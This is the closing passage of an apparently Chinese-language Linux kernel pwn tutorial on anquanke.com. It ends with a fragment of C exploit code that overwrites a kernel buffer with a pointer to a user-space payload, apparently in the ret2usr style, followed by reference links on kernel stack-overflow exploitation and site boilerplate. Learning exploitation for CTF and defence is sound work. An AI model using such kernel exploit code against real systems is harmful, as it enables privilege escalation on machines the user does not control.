        write(1,"OK!n",sizeof(Eip));
        *((void**)(Eip)) = &payload;
        write(fd,Eip,sizeof(Eip));
        read(fd,receive,255);
        return 0;
    }
    

## 0x08 参考链接

[CTF-Wiki Linux Kernel](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel)

[Exploiting Stack Overflows in the Linux Kernel – Jon
Oberheide](https://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/)

[A Kernel Exploit Step by Step –
akliilias](https://www.coursehero.com/file/49274885/kernel-exploit-step-by-steppdf/)

[kernel pwn（0）：入门&ret2usr – Magpie](https://www.anquanke.com/post/id/172216)

[Linux-内核编译 –
咲夜南梦](https://196011564.github.io/2020/02/26/Linux-%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/#%E6%89%A7%E8%A1%8C%E4%BB%A5%E4%B8%8B%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BDkernel%E6%BA%90%E7%A0%81)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ERROR404** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/201043](/post/id/201043)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [Kernel Security](/tag/Kernel Security)

 **+1** __25赞

 __收藏

![](https://p5.ssl.qhimg.com/t01fc6ae8fa56997fe6.jpg) ERROR404

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

